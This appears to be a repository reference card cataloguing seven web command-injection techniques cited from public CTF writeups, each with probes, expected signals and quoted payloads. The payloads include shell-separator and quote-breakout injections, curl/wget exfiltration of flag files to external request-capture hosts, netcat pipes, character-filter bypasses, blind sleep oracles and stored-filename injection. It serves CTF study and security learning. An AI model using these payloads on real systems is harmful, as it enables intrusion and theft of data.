# web-command-injection — techniques reported in public CTF writeups

**This is published knowledge, not local experience.** Nothing here was solved
in this repository. `evidence_level` for this class stays `catalogue` and
this class's field notes stay a template stub on purpose: that stub is the
honest backlog of classes nothing here has solved.
Every claim below carries the writeup URL it came from and a verbatim span
from the fetched page. A writeup's own claim is not verification.

Source: 18,493-URL public writeup catalog, fetched and distilled
2026-09-26; each card was checked by a second pass that rejected 48 of 150.


## 1. Terminate the interpolated argument of a host-diagnostic shell command with a shell separator (; && | newline) so the rest of the field is parsed as a second command by the same shell.

- **status**: `writeup-claimed` — no target was probed for this here
- **why it works**: The handler builds one shell string by concatenating a user field (ip, host, target, ls arguments) into a template and hands it to a shell-invoking call, so the separator is metacharacter-live: it is never quoted, escaped, or passed as a single argv element.
- **first probe**: Submit the benign value the field expects with a separator and a harmless command appended, e.g. the ip/host field set to 127.0.0.1;id (URL-encode the semicolon if the field travels in a query string).
- **expected signal**: The normal tool output (ping/nslookup/ls) is followed in the same response body by the second command's own output -- a uid=... line, a directory listing, or a hostname -- with no error about an invalid address.
- **falsifier**: The whole value, separator included, comes back inside one error message such as 'invalid IP address' or is resolved as a single hostname: the field is validated or passed as one argv element, so try argument injection or a quoted-context breakout instead.
- **sources** (6):
  - Insomni'hack teaser 2020 — https://eine.tistory.com/entry/Insomnihack-teaser-2020-web-Low-Deep-write-up
    > Let's input the 127.0.0.1;ls Any other command like cat, /bin, bash is not appli
  - SHA2017 CTF — https://infosec.rm-it.de/2017/08/07/sha2017-ctf-network-300-abuse-mail-challenge
    > GET /?ip=google.com;ls Further down in the HTTP stream he uploads malicious Python script
  - Cyber Heroines CTF — https://github.com/D13David/ctf-writeups/blob/main/cyberheroines23/web/radia_perlman/README.md
    > We can try this by passing in `dns?ip=0.0.0.0;ls`. ``` Command Output: ** server can't find 0.0.0.0.in-addr.arpa: NXDOM
  - UA CWS CTF 2022 — https://ctftime.org/writeup/34049
    > This can be tested with ```bash ; cat /etc/passwd ```
  - TAMUctf 19 — https://github.com/zst123/tamuctf-2019-writeups/tree/master/Solved/Pwn4
    > Enter the arguments you would like to pass to ls: ; cat flag.txt Result of ls ; cat flag.txt: flag.txt pwn4
  - Cyber Apocalypse 2023: The Cursed Mission — https://siunam321.github.io/ctf/Cyber-Apocalypse-2023/Web/Gunhead
    > whoami ; hostname ; id ; ip a www ng-gunhead-axuru-69c8bcb87c-nsl6z uid = 1000 ( www ) gid = 1

## 2. Close the quote that the command template wraps the value in, append the command, and comment out or absorb the template's trailing text with # so the rest of the line does not break the syntax.

- **status**: `writeup-claimed` — no target was probed for this here
- **why it works**: The value is interpolated inside a single- or double-quoted word of the command string, so a bare separator is literal data; a matching quote character ends the quoted word, a separator starts a new command, and # discards the template's leftover characters that would otherwise leave an unterminated quote.
- **first probe**: Send one unbalanced quote alone in the field (' then, separately, ") and read the response, then send <quote>; id #, URL-encoding the # when the value travels in a query string.
- **expected signal**: The bare quote yields a shell syntax error naming the quoting state, e.g. 'Syntax error: Unterminated quoted string', and the closed-quote payload returns the injected command's output where the template's own output used to be.
- **falsifier**: Neither quote character changes the response and no syntax error appears: the value is escaped (escapeshellarg-style) or never reaches a shell string, so switch to argument injection or a different sink.
- **sources** (5):
  - Insomni'hack 2023 — https://github.com/p4-team/ctf/tree/master/2023-03-24-insomnihack-finals/insobot
    > when suddenly: ```html '$(id) ``` ```console sh: 1: Syntax error: Unterminated quoted string ```
  - Cyber Apocalypse 2024: Hacker Royale — https://github.com/MicheleMosca/CTF/blob/main/Cyber%20Apocalypse%202024/web/TimeKORP/README.md
    > So we can send this as **format** parameter: ``` ?format='; cat ../flag # ``` To make the exploit working, need to URL encode the **#** mark.
  - csictf 2020 — https://github.com/ouxs-19/CTF_Writeups/tree/master/csictf-web-Body_count
    > So after that I tried `'; ls #` and this was the result : ``` The Character Count is: wc.php ``` Bingo ! Our code injection
  - BuckeyeCTF 2024 — https://github.com/Execut3/CTF/tree/master/Writeups/2024/BuckeyeCTF/runway0
    > $ nc challs.pwnoh.io 13400 Give me a message to say! hello"; cat flag.txt _______ ------- \ ^__^ \ (oo)\_______
  - TUCTF 2017 — https://github.com/rkmylo/ctf-write-ups/tree/master/2017-tuctf/web/iframe-and-shame-300
    > "; ../../../../../../usr/bin/wget https://requestb.in/1k2lrzs1?x=$(../../../../../../usr/bin/base64 ../../../../../../home/chal/iFrame-and-Shame/flag) # ```

## 3. When metacharacters are escaped but the value is still split into argv, inject an extra option for the program being run (curl -d/-F/-o, jp2a --html-title, a date/gum argument) instead of a second command.

- **status**: `writeup-claimed` — no target was probed for this here
- **why it works**: escapeshellcmd, an argv spread, or an unquoted variable in a shell script neutralises separators but preserves word splitting, so a leading dash or an added space makes the value parse as further flags of the already-trusted binary; the binary's own features then read or write the target file.
- **first probe**: Replace the value with an option the invoked binary accepts plus a destination you control, e.g. the url/ip field set to -d @/flag http://<your-host>/ for a curl-based endpoint, or an --output-style flag for the converter in use.
- **expected signal**: The invoked tool obeys the new flag: an inbound request arrives at your listener carrying the file contents, or the tool's output changes shape (a title, an output path, an error naming the injected option) without any shell error.
- **falsifier**: The value always appears as the tool's positional target and a leading dash produces only the tool's normal 'not a valid URL/file' error: it is quoted as one argument and option parsing never sees it.
- **sources** (5):
  - Cyber Apocalypse 2021 — https://github.com/KamilPacanek/writeups/blob/master/ctf/HTB.CA2021/caas.md
    > curl -H "application/x-www-form-urlencoded" -d 'ip=-F fg=@../../flag 1f106a9e85a2.ngrok.io' -v 138.68.178.56:32236
  - Cyber Apocalypse 2021 — https://github.com/rudradesai200/CTFs/tree/master/CyberApocalypse2021/web_caas
    > pass the following request using postman `-d @../../flag https://hookb.in/lJ2wk1D18NcrXXZWdyND` - -d options passed data and @
  - ASIS CTF Quals 2021 — https://fireshellsecurity.team/asisctf-ascii-art-as-a-service
    > env_file = ' ../../../../../../../../../../proc/self/environ ' title_payload = f ' --html-title= " anyshit| { session
  - ASIS CTF Quals 2021 — https://clubby789.me/aaaas
    > payload = f "| { sid } |../../proc/self/environ|" # jp2a mixed up the characters so we had to rearrange the string a
  - NahamCon CTF 2023 — https://ctftime.org/writeup/37248
    > The critical component is the boolean check ``` if [[ $(date $guess_date) == $(date -d $TARGET_DATE +%Y-%m-%d) ]] ``` where if you run through

## 4. Prefix the value with a pipe character so a Ruby Kernel#open / open-uri call (or a Perl two-argument open) treats the rest of the string as a command line to run rather than a path or URL to fetch.

- **status**: `writeup-claimed` — no target was probed for this here
- **why it works**: open() dispatches on the first character of its argument: a leading | means 'run this and give me its pipe', so a fetch-a-URL feature that passes the user string straight to open is a command sink even though no shell metacharacter and no concatenation is involved.
- **first probe**: Submit |id (or |cat /etc/passwd) as the site/url/id parameter that the app fetches and read the body it returns.
- **expected signal**: The response contains the command's stdout where the fetched page should be -- the /etc/passwd lines or the uid= line rendered as the retrieved document.
- **falsifier**: The app returns a URI/HTTP error for the |-prefixed value, or fetches it as a relative path: the fetch goes through a real HTTP client (Net::HTTP, requests) and not through open.
- **sources** (4):
  - VolgaCTF 2018 Quals — https://github.com/newclem/ctfs/blob/master/2018/VolgaCTF_quals/old_government_site.md
    > and so it can read the /flag file and send it to a server: `|curl -d "$(cat /flag)" -X POST http://ptsv2.com/t/3awt7-1521988385/post` (we use ptsv2 webs
  - VolgaCTF 2018 Quals — https://github.com/phi0/phi0.github.io/blob/master/_posts/2018-03-24-volgactf-2018%20-%20Old%20Government.md
    > After some directory listing, we saw the flag file: `site=| cat ../../flag | netcat ` Done!
  - Nuit du Hack CTF Quals 2018 — https://www.asafety.fr/vuln-exploit-poc/ctf-ndh-2018-quals-write-up-web-crawl-me-maybe
    > url=|cat ../../../../../../../etc/passwd Les sources complète du « crawler » peuvent être récupérées via :
  - Nuit du Hack CTF Quals 2018 — https://www.asafety.fr/vuln-exploit-poc/ctf-ndh-2018-quals-write-up-web-crawl-me-maybe
    > url=|find ../../../../../home/challenge/src/ -exec cat {} \;

## 5. Rebuild a blocked command out of the characters the filter still allows: ${IFS} or a redirection for the space, globs like /???/??? for letters, and $(( $$/$$ )) arithmetic for digits.

- **status**: `writeup-claimed` — no target was probed for this here
- **why it works**: The filter is a character allow/deny list applied to the string, but the shell expands globs, ${...} parameter forms and $(( )) arithmetic after the filter has run, so the forbidden bytes are produced by the shell itself and never appear in the submitted input.
- **first probe**: Re-send the command that was rejected with each blocked byte replaced by its expansion -- spaces as ${IFS}, the binary path as a ? glob, one digit as $(( $$/$$ )) -- and compare against the rejection baseline.
- **expected signal**: The rejection message disappears and the command's real output comes back, proving the shell expanded the substitute rather than the filter matching it.
- **falsifier**: The same rejection appears for the expansion-only payload, or the input is echoed literally: the filtering happens after expansion, or the value never reaches a shell that expands.
- **sources** (6):
  - NorzhCTF 2021 — https://stackotter.dev/blog/norzh-ctf-2021-leet-computer-writeup
    > also wont allow space characters but they can be replaced with "${{IFS}}". Commands can also be concatenated with "``". The script takes care
  - FE-CTF 2022: Cyber Demon — https://pyjam.as/writeups/fectf2022
    > command injection (f.eks. med ;cat<dig|base64 ), reverse engineer den og finde en flag-funktion eller lignende. Vore
  - HITB-XCTF GSEC CTF 2018 Quals — https://nandynarwhals.org/hitbgsecquals2018-readfile
    > We can make numbers with the following primitive (1): $(( $$/$$ )) Next, we can get the string “runsh” in: ${!#} No
  - Insomni'hack teaser 2019 — https://github.com/p4-team/ctf/blob/master/2019-01-19-insomnihack-quals/echoechoechoecho/README.md
    > We can make digits using bash arithmetics though: `$(($$==$$))` is `1` and we can add up to nine ones to get any digit. We wrote a
  - 33C3 CTF — https://github.com/InfoSecIITR/write-ups/tree/master/2016/33c3-ctf-2016/misc/hohoho
    > ; /???/????????????/n??? '/^[^'$((${#?} / ${#?} + ${#?} / ${#?}))']+$/' @; # ``` Now, the `@` file contains the required password, a
  - InCTF 2018 — https://github.com/fikih888/CTFs/tree/master/InCTF%202018%20-%20WildCat%20-%20Web%20Chall
    > use the character “?” to replace them. In the first try, we tried “../../../../../../../../../../???/??? ????.???” for “../../../../../../../../../../bin/cat flag.php” but we

## 6. When the injected command's output is not reflected, turn the injection into a channel: pipe the data to an outbound request you receive (curl/wget to your host, in the path, a header or a form field), or ask one yes/no question per request with sleep.

- **status**: `writeup-claimed` — no target was probed for this here
- **why it works**: Execution and output are separate properties: a template that discards or fixes stderr/stdout still runs the command, so the process's own network access or its wall-clock delay carries the answer back instead of the response body.
- **first probe**: Inject one callback with the data inline -- ;curl http://<your-host>/$(ls|base64) -- with a listener running; if outbound traffic is blocked, inject a single conditional sleep such as if [ $(cat /flag.txt | wc -c) == N ]; then sleep 5; fi and time the response.
- **expected signal**: A hit arrives at your listener whose path/header/body decodes to the command output, or the response takes the injected sleep duration for exactly one value of the tested condition and the baseline time for the others.
- **falsifier**: No callback arrives for any encoding and every response time matches the baseline within noise: either nothing executed, or the host has no egress and no usable delay primitive -- prove execution another way before spending more probes.
- **sources** (5):
  - RaRCTF 2021 — https://iwanflagz.github.io/RaRCTF-2021-writeups/web/maas1.html
    > cmd = "if [ $(cat /flag.txt | cut -c {}) == {} ]; then sleep {}; fi" . format ( i , chr ( c ), tim
  - picoCTF 2018 — https://ctftime.org/writeup/11761
    > ip=127.0.0.1;cat the-secret-1335-flag.txt|base64|xargs wget http://my_server --user-agent ``` ↓ ``` 18.224.157.204 - - [15/Oct/2018:15:24:13
  - picoCTF 2018 — https://github.com/liuhack/writeups/blob/master/2018/picoCTF/Fancy-alive-monitoring/README.md
    > 192.168.1.109 ; curl -F 'data=@./flag.txt' https://requestinspector.com/inspect/01crk4yxhq4nxg1z12fajan5cq Then I get a connect back with the flag
  - SarCTF by Saratov State University — https://spotless.tech/sarctf-Some%20bot.html
    > /ping 127.0.0.1;a=$(base64 -w0 flag.jpg); curl -H "Flag: $a" "http://my_server/lol" Pro-tip: listen on
  - picoCTF 2018 — https://ctftime.org/writeup/11721
    > ip=1.1.1.1;curl http://IP/`ls|base64` ``` We got: `"GET /aW5kZXgucGhwCmluZGV4LnR4dAp0aGUtc2VjcmV0LTE1NTUtZmxhZy50eHQKeGluZXRfc3RhcnR1 HTTP/1.1"

## 7. Store the payload as a name -- an uploaded filename, a directory created through the app, a record title, an issue title -- and let a later job that interpolates that name into a shell command execute it.

- **status**: `writeup-claimed` — no target was probed for this here
- **why it works**: The write path validates the name as data and the read path treats it as part of a command line, so the shell metacharacters survive storage; the command runs in the context of the background worker, converter or CI runner, not of the request that planted it.
- **first probe**: Create one object whose name carries a benign command in the template's own syntax (a file named like s';id;'.png, a directory named ;id, a title containing $(id)), then trigger the feature that processes it -- convert, list, build.
- **expected signal**: The processing step's output or log shows the command ran -- the injected command's stdout appears in the conversion result, the listing, or the job log -- while the name is still stored verbatim.
- **falsifier**: The name is rewritten on save (sanitised, hashed, or given a generated basename) or the worker passes it as one argv element: the stored string that reaches the command is no longer the one submitted.
- **sources** (3):
  - 0xL4ugh CTF 2024 — https://ctftime.org/writeup/38623
    > -rw-r--r-- 1 challeng challeng 9 Feb 9 17:18 ;id; -rw-r--r-- 1 challeng challeng 9 Feb 9 17:27 a -rw-r--r-- 1 challeng challeng 9 Feb 9 19:11 alo -rw-rw-r
  - HTB Business CTF 2022: Dirty Money — https://fascinating-confusion.io/posts/2022/07/htb-business-ctf-22-insider-writeup
    > b 'mkd ;sh' ) sla ( b ' \n ' , b 'cwd ;sh' ) sla ( b ' \n ' ,
  - Equinor CTF 2023 — https://github.com/ept-team/equinor-ctf-2023/tree/main/writeups/Misc/poisonpwn/munintrollet
    > uses an environment variable we can manipulate, namely the title (`${{ github.event.issue.title }}`). ![pic2](pic2.png) #### Confirming the Injection Point This can
